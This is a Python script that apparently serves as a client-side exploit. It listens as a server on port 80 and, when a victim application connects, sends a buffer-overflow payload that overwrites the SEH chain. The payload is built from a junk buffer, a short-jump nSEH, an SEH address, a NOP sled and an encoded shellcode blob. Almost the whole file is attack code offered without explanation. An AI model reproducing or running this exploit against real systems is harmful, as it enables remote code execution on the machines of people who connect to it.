import sys
import socket
import os
import time

host = "192.168.84.136"
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print
"\n[+] listening on %d ..." % port

bz, addr = s.accept()
print
"[+] connection accepted from %s" % addr[0]

junk = "A" * 4104
# jump 6
nseh = "\xeb\x06\x90\x90"
seh = "\x51\xa0\x94\x73"

shell = (
    "\xda\xd8\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x52\xbb\x9e\x18\x20"
    "\xeb\x31\x5a\x17\x83\xc2\x04\x03\xc4\x0b\xc2\x1e\x04\xc3\x80"
    "\xe1\xf4\x14\xe5\x68\x11\x25\x25\x0e\x52\x16\x95\x44\x36\x9b"
    "\x5e\x08\xa2\x28\x12\x85\xc5\x99\x99\xf3\xe8\x1a\xb1\xc0\x6b"
    "\x99\xc8\x14\x4b\xa0\x02\x69\x8a\xe5\x7f\x80\xde\xbe\xf4\x37"
    "\xce\xcb\x41\x84\x65\x87\x44\x8c\x9a\x50\x66\xbd\x0d\xea\x31"
    "\x1d\xac\x3f\x4a\x14\xb6\x5c\x77\xee\x4d\x96\x03\xf1\x87\xe6"
    "\xec\x5e\xe6\xc6\x1e\x9e\x2f\xe0\xc0\xd5\x59\x12\x7c\xee\x9e"
    "\x68\x5a\x7b\x04\xca\x29\xdb\xe0\xea\xfe\xba\x63\xe0\x4b\xc8"
    "\x2b\xe5\x4a\x1d\x40\x11\xc6\xa0\x86\x93\x9c\x86\x02\xff\x47"
    "\xa6\x13\xa5\x26\xd7\x43\x06\x96\x7d\x08\xab\xc3\x0f\x53\xa4"
    "\x20\x22\x6b\x34\x2f\x35\x18\x06\xf0\xed\xb6\x2a\x79\x28\x41"
    "\x4c\x50\x8c\xdd\xb3\x5b\xed\xf4\x77\x0f\xbd\x6e\x51\x30\x56"
    "\x6e\x5e\xe5\xf9\x3e\xf0\x56\xba\xee\xb0\x06\x52\xe4\x3e\x78"
    "\x42\x07\x95\x11\xe9\xf2\x7e\xde\x46\xa8\xf6\xb6\x94\x50\x06"
    "\xfc\x10\xb6\x62\x12\x75\x61\x1b\x8b\xdc\xf9\xba\x54\xcb\x84"
    "\xfd\xdf\xf8\x79\xb3\x17\x74\x69\x24\xd8\xc3\xd3\xe3\xe7\xf9"
    "\x7b\x6f\x75\x66\x7b\xe6\x66\x31\x2c\xaf\x59\x48\xb8\x5d\xc3"
    "\xe2\xde\x9f\x95\xcd\x5a\x44\x66\xd3\x63\x09\xd2\xf7\x73\xd7"
    "\xdb\xb3\x27\x87\x8d\x6d\x91\x61\x64\xdc\x4b\x38\xdb\xb6\x1b"
    "\xbd\x17\x09\x5d\xc2\x7d\xff\x81\x73\x28\x46\xbe\xbc\xbc\x4e"
    "\xc7\xa0\x5c\xb0\x12\x61\x6c\xfb\x3e\xc0\xe5\xa2\xab\x50\x68"
    "\x55\x06\x96\x95\xd6\xa2\x67\x62\xc6\xc7\x62\x2e\x40\x34\x1f"
    "\x3f\x25\x3a\x8c\x40\x6c"
)
fill = "B" * 7500
nops = "\x90" * 100
payload = junk + nseh + seh + nops + shell + fill

print
bz.recv(1000)
bz.send(payload)
print
"[+] sending buffer ok\n"

time.sleep(3)
bz.close()
s.close()